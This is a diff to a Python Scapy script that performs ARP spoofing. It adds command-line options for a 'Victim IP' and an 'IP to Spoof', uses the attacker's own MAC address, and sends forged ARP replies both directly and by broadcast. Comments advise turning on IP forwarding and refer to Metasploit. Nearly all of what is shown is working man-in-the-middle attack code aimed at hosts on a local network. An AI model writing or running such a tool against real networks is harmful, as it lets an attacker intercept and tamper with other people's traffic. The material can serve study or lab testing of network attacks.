@@ -3,15 +3,30 @@ import time
 #import sys
 from multiprocessing import Process ,Queue
 #import os 
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--target" , help= "Victim IP", required=True)
+parser.add_argument("--spoof" , help="IP to Spoof" , required=True)
+args = parser.parse_args()
+
+
+#dont forget to enable for the love of god ip forwarding
 
 
 iface = conf.iface
 MyMAC = get_if_hwaddr(iface)
 MyIP = get_if_addr(iface)
 
-fake_mac = "08:00:27:aa:97:97"
-fake_ip= "192.168.1.102" #who we are impersonating
-ip_victim="192.168.1.101"
+#fake_mac = "08:00:27:aa:97:97"
+fake_mac = MyMAC
+
+#fake_ip= "192.168.1.1" #who we are impersonating
+#ip_victim="192.168.1.101"
+
+ip_victim = args.target
+fake_ip = args.spoof
+
 mac_victim = ""
 mac_suplatation = ""
 #newest python bversions dont need import keyboard
@@ -42,6 +57,12 @@ def sniffer(q):
         #print(f"print fake ip {fake_ip}")
         #print(f"print here  ip victm {ip_victim}")
         frame = Ether(src = fake_mac, dst = mac_victim)/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_suplatation, hwdst = mac_victim)
+        sendp(frame,iface=iface, count = 10,inter = 1, verbose = 1) #to revert the metasploit or the suplantation ip we doing atm
+        #also needed to change inter form 0.05 to 1 becase it seems some replies in some OS arent apt enoght to receive at that speed, so better 1 sec
+
+        #important note, here we restoring the 2 device, but the request will broadcast, so thats a problem, our mac will be on the other hosts
+
+        frame = Ether(src = fake_mac, dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_suplatation, hwdst = "ff:ff:ff:ff:ff:ff")
         sendp(frame,iface=iface, count = 10,inter = 1, verbose = 1) #to revert the metasploit or the suplantation ip we doing atm
 
         aux = fake_ip
